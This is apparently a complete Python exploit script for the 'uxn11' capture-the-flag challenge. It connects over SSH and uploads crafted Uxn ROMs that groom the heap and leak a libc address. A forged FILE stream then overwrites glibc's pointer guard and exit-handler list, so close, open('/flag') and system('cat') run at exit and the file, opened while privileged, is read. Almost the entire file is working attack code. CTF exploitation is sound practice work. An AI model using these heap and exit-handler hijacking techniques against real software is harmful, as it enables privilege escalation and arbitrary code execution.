"""Two-stage proof of concept for the uxn11 challenge.

Exploit flow:
1. Prepare exact directory listings outside the Uxn process.
2. Use them to overlap DIR/FILE allocations and leak libc.
3. Send a second ROM that grooms the same allocations into a known layout.
4. Refill one forged string stream to perform two direct writes.
5. Exit normally so the callbacks set uid 0, start a shell, and print the flag.
"""

import io
import secrets
import sys
import tarfile
from pathlib import Path

from pwn import ELF, context, flat, log, p16, rol, ssh, u64

context.arch = "amd64"

root = b""
STAGE, STAGE_SIZE = 0x8000, 0x4000
GROOM_FILE = b"groom-file"
OVERFLOW_DIRECTORIES = tuple(f"overwrite-{width:02d}".encode() for width in range(16))
REMOTE_WORKDIR = "/tmp"
LIBC_CACHE = "/tmp/uxn11-remote-libc.so.6"
REMOTE_ROM = f"{REMOTE_WORKDIR}/uxn11.rom"

# Internal globals in the challenge's exact glibc build.
IO_STR_JUMPS = 0x210EE0
INITIAL_EXIT_LIST = 0x213FA0
POINTER_GUARD_FROM_LIBC = -0x2890


class Uxn:
    def __init__(self):
        self.code = bytearray()
        self.labels = {}
        self.fixups = []

    def byte(self, *values):
        self.code.extend(values)

    def lit(self, value):
        self.byte(0x80, value & 0xFF)

    def lit2(self, value):
        self.byte(0xA0, value >> 8, value & 0xFF)

    def label(self, name):
        self.labels[name] = len(self.code)

    def branch(self, opcode, label):
        self.byte(opcode, 0, 0)
        self.fixups.append((len(self.code) - 2, label))

    def finish(self):
        for at, label in self.fixups:
            offset = (self.labels[label] - at - 2) & 0xFFFF
            self.code[at : at + 2] = offset.to_bytes(2, "big")
        return bytes(self.code)


def sta(u, address, value):
    u.lit(value)
    u.lit2(address)
    u.byte(0x15)


def sta2(u, address, value):
    u.lit2(value)
    u.lit2(address)
    u.byte(0x35)


def deo2(u, port, value):
    u.lit2(value)
    u.lit(port)
    u.byte(0x37)


def write_bytes(u, address, data):
    for i, value in enumerate(data):
        sta(u, address + i, value)


def tree_archive(root_name):
    """Build the directory fixture without touching the target process heap."""
    output = io.BytesIO()
    with tarfile.open(
        fileobj=output,
        mode="w:gz",
        format=tarfile.GNU_FORMAT,
        encoding="utf-8",
        errors="surrogateescape",
    ) as archive:

        def add(path, kind, mode):
            member = tarfile.TarInfo(str(path))
            member.type = kind
            member.mode = mode
            member.mtime = 0
            archive.addfile(member)

        add(root_name, tarfile.DIRTYPE, 0o755)
        add(root_name / GROOM_FILE.decode(), tarfile.REGTYPE, 0o666)

        layouts = tuple(
            (directory, 19 + width, 251, 255)
            for width, directory in enumerate(OVERFLOW_DIRECTORIES)
        )

        for directory, remainder, count, length in layouts:
            base = root_name / directory.decode()
            add(base, tarfile.DIRTYPE, 0o755)
            add(base / ("A" * remainder), tarfile.REGTYPE, 0o644)
            if directory == OVERFLOW_DIRECTORIES[0]:
                # Paired with overwrite-00/0001 below: their lengths cancel.
                add(base / ("C" * 221), tarfile.REGTYPE, 0o644)
            for n in range(count):
                member_length = length
                if directory == OVERFLOW_DIRECTORIES[0]:
                    # The terminator of this final getdents record occupies
                    # the byte that stage two's 0xfff-byte fwrite cannot set.
                    member_length = 28 if n == 1 else length
                name = f"{n:04d}" + ("A" * (member_length - 4))
                add(base / name, tarfile.REGTYPE, 0o644)
    return output.getvalue()


def cycle_overflow_widths(u, path, destination):
    for directory in reversed(OVERFLOW_DIRECTORIES):
        write_bytes(u, path, root + directory + b"\0")
        deo2(u, 0xB8, path)
        deo2(u, 0xBA, 1)
        deo2(u, 0xBC, destination)


def stage1(root):
    u = Uxn()
    path, data, destination = 0x4000, 0x5000, 0x7000

    # Orphaning one FILE shifts the following stdio buffer so that clearing
    # the low byte of the adjacent DIR pointer lands at buffer + 0xf30.
    write_bytes(u, path, root + GROOM_FILE + b"\0")
    deo2(u, 0xA8, path)
    deo2(u, 0xAA, 0)
    deo2(u, 0xAE, data)
    cycle_overflow_widths(u, path, destination)
    deo2(u, 0xB8, path)

    # Place a fake DIR in the leak stream's stdio buffer. After that buffer is
    # freed, its result names the arena pointer written into the freed chunk.
    write_bytes(
        u,
        data + 0xF30,
        flat({0: 0xFFFFFFFF, 0x10: -0x0F6A, 0x18: -0x0F6B}, filler=b"\0"),
    )
    write_bytes(u, path, root + GROOM_FILE + b"\0")
    deo2(u, 0xB8, path)
    deo2(u, 0xBA, 0x0FFF)
    deo2(u, 0xBE, data)
    write_bytes(u, path, root + OVERFLOW_DIRECTORIES[8] + b"\0")
    deo2(u, 0xA8, path)
    deo2(u, 0xAA, 1)
    deo2(u, 0xAC, destination)
    deo2(u, 0xB8, path)
    deo2(u, 0xAA, 0x20)
    deo2(u, 0xAC, destination)

    # leak
    for i in range(5, 11):
        u.lit2(destination + i)
        u.byte(0x14)
        u.lit(0x19)
        u.byte(0x17)

    cycle_overflow_widths(u, path, destination)
    deo2(u, 0xB8, path)

    # After leaking, the console vector reads the fixed-size second stage.
    count = 0x0800
    sta2(u, count, 0)
    vector_at = len(u.code)
    deo2(u, 0x10, 0)
    u.byte(0)
    u.label("loader")
    u.lit(0x12)
    u.byte(0x16)
    u.lit2(count)
    u.byte(0x34)
    u.lit2(STAGE)
    u.byte(0x38, 0x15)
    u.lit2(count)
    u.byte(0x34, 0x21, 0x26)
    u.lit2(count)
    u.byte(0x35)
    u.lit2(STAGE_SIZE)
    u.byte(0x28)
    u.branch(0x20, "run")
    u.byte(0)
    u.label("run")
    u.lit2(STAGE)
    u.byte(0x2C)

    code = bytearray(u.finish())
    vector = 0x100 + u.labels["loader"]
    code[vector_at + 1 : vector_at + 3] = p16(vector, endian="big")
    return bytes(code)


def stage2(root, libc):
    u = Uxn()
    path, data, destination = 0x1000, 0x4000, 0x7000

    def write_fake_file(target, length):
        fake_file = flat(
            {
                0x00: 0xFBAD8000,
                0x20: target,
                0x28: target,
                0x30: target + length,
                0xC0: 0xFFFFFFFF,
                0xD8: libc.address + IO_STR_JUMPS,
            },
            filler=b"\0",
        )
        write_bytes(u, data + 0xF20, fake_file)

    def groom_once(length):
        # Orphan this FILE after the overflow directories clear its pointers.
        write_bytes(u, path, root + GROOM_FILE + b"\0")
        deo2(u, 0xA8, path)
        deo2(u, 0xAA, length)
        deo2(u, 0xAE, data)
        cycle_overflow_widths(u, path, destination)
        deo2(u, 0xB8, path)

    # Two buffers and one FILE leave the payload buffer ending in ...e0, so
    # clearing the following FILE pointer's low byte selects the fake FILE at +0xf20.
    groom_once(0x0FFF)
    groom_once(0x0FFF)
    groom_once(0)

    # Exit callbacks run in reverse order: close(0), then open("/flag", 0)
    # (which reclaims fd 0 as /flag -- the permission check happens here,
    # while euid is still "flag"), then system("cat") last.
    #
    # A shell spawned via system() always execs /bin/sh, and POSIX sh drops
    # its effective UID to match the real UID on startup whenever they
    # differ (dash does this unconditionally, not just bash -- there is no
    # command string that avoids it, since glibc's system() always runs
    # `/bin/sh -c <command>` regardless of what <command> is). So the
    # dropped-privilege "cat" can never read /flag directly by name. But a
    # file opened *before* the drop keeps working after it -- Linux checks
    # permissions at open(), not at each read() -- so cat with no argument,
    # inheriting fd 0 already pointed at /flag, reads it just fine.
    #
    # Each forged call only gets one attacker-controlled argument (RDI);
    # the second (RSI) is always the process's exit status. That status is
    # `dev[0x0f] & 0x7f` (see uxncli11.c's main()), so the halt trigger
    # below writes 0x80 instead of 1 -- still nonzero (still halts), but
    # masks to a status of 0, which open() needs as its O_RDONLY flags.
    #
    # "cat\0" and "/flag\0" live in the tail of the same `initial` struct
    # we're already overwriting, past the 3 records __run_exit_handlers
    # actually reads (idx=3) -- reusing the existing arbitrary-write
    # instead of needing a second leak for a fresh scratch address.
    cat_off, flag_path_off = 0x70, 0x78
    exit_records = flat(
        {
            0x08: 3,
            0x10: 4,
            0x18: rol(libc.sym["system"], 17),
            0x20: libc.address + INITIAL_EXIT_LIST + cat_off,
            0x30: 4,
            0x38: rol(libc.sym["open"], 17),
            0x40: libc.address + INITIAL_EXIT_LIST + flag_path_off,
            0x50: 4,
            0x58: rol(libc.sym["close"], 17),
            0x60: 0,
            cat_off: b"cat\0",
            flag_path_off: b"/flag\0",
        },
        filler=b"\0",
    )
    write_bytes(u, data + 0x100, exit_records)

    write_fake_file(libc.address + POINTER_GUARD_FROM_LIBC, 8)

    # File 2 owns the payload buffer. File 1's following FILE allocation is
    # the victim whose low pointer byte will be cleared.
    write_bytes(u, path, root + GROOM_FILE + b"\0")
    deo2(u, 0xB8, path)
    deo2(u, 0xBA, 0x0FFF)
    deo2(u, 0xBE, data)
    write_bytes(u, path, root + GROOM_FILE + b"\0")
    deo2(u, 0xA8, path)
    deo2(u, 0xAA, 0)
    deo2(u, 0xAE, data)

    # Switching file 2 to the exact-width directory frees its payload buffer.
    # The listing terminator lands on ufs[0].f without crossing either context.
    write_bytes(u, path, root + OVERFLOW_DIRECTORIES[0] + b"\0")
    deo2(u, 0xB8, path)
    deo2(u, 0xBA, 1)
    deo2(u, 0xBC, destination)

    # The first forged stream gives exit callbacks a known pointer guard.
    deo2(u, 0xAA, 8)
    deo2(u, 0xAE, data + 0x100)

    # Reopening file 2 reclaims and refills the buffer still referenced by
    # file 1's corrupted pointer.
    write_fake_file(libc.address + INITIAL_EXIT_LIST, len(exit_records))
    write_bytes(u, path, root + GROOM_FILE + b"\0")
    deo2(u, 0xB8, path)
    deo2(u, 0xBA, 0x0FFF)
    deo2(u, 0xBE, data)

    # The rewritten stream replaces glibc's existing exit-function list.
    deo2(u, 0xAA, len(exit_records))
    deo2(u, 0xAE, data + 0x100)

    # Returning from the VM terminates uxn11 normally and runs the forged
    # callbacks from glibc's ordinary exit-function list. 0x80 (not 1):
    # still nonzero so the halt loop still breaks, but masks to a process
    # exit status of 0 (see the comment above exit_records).
    u.lit(0x80)
    u.lit(0x0F)
    u.byte(0x17, 0)

    result = u.finish()
    assert len(result) <= STAGE_SIZE
    return result.ljust(STAGE_SIZE, b"\0")


def remote_status(session, command):
    io = session.system(command, cwd=REMOTE_WORKDIR, tty=False)
    try:
        output = io.recvall()
        return io.wait(), output
    finally:
        io.close()


def cleanup(session, *paths):
    paths = [path for path in paths if path]
    if not paths:
        return
    paths = [path.decode() if isinstance(path, bytes) else path for path in paths]
    command = "rm -rf -- " + " ".join(path for path in paths) + " 2>/dev/null"
    remote_status(session, command)


def prepare_tree(session, root_name, archive_path):
    session.upload_data(tree_archive(root_name), archive_path)
    status, output = remote_status(session, f"tar -xpzf {archive_path} -C /dev/shm")
    if status:
        raise RuntimeError(f"could not extract directory fixture: {output!r}")


def main():
    global root
    if len(sys.argv) not in (3, 4):
        raise SystemExit(f"usage: {sys.argv[0]} HOST PORT [ROUTE_USER]")

    route_user = sys.argv[3] if len(sys.argv) == 4 else "ctf"

    session = ssh(
        host=sys.argv[1],
        port=int(sys.argv[2]),
        user=route_user,
        auth_none=True,
        ignore_config=True,
        cache=False,
        raw=True,
    )

    with session:
        session.download_file("/usr/lib/x86_64-linux-gnu/libc.so.6", LIBC_CACHE)
        libc = ELF(LIBC_CACHE)

        root_name = Path(secrets.token_hex(3))
        root = f"../../dev/shm/{root_name}/".encode()
        remote_tree = f"{REMOTE_WORKDIR}/{root_name}.tar.gz"
        assert len(root) == 21

        prepare_tree(session, root_name, remote_tree)

        session.upload_data(stage1(root), REMOTE_ROM)
        io = session.system(
            f"exec /usr/sbin/uxn11 {REMOTE_ROM} 2>&1",
            cwd=REMOTE_WORKDIR,
            tty=False,
        )

        try:
            leak = io.recvn(6)
            if len(leak) != 6:
                raise EOFError("stage one did not return the libc leak")
            libc_pointer = u64(leak.ljust(8, b"\0"))
            libc.address = libc_pointer - libc.sym["_IO_2_1_stdin_"] - 0x1E8

            log.info(f"libc: {libc.address:#x}")

            # Stage two reuses the existing allocator state and installs the
            # exit records; the forged chain (close/open/cat) runs the flag
            # straight to stdout with no further input needed.
            io.send(stage2(root, libc))
            sys.stdout.buffer.write(io.recvall())
        finally:
            io.close()
            cleanup(
                session,
                REMOTE_ROM,
                remote_tree,
                f"/dev/shm/{root_name}",
            )


if __name__ == "__main__":
    main()
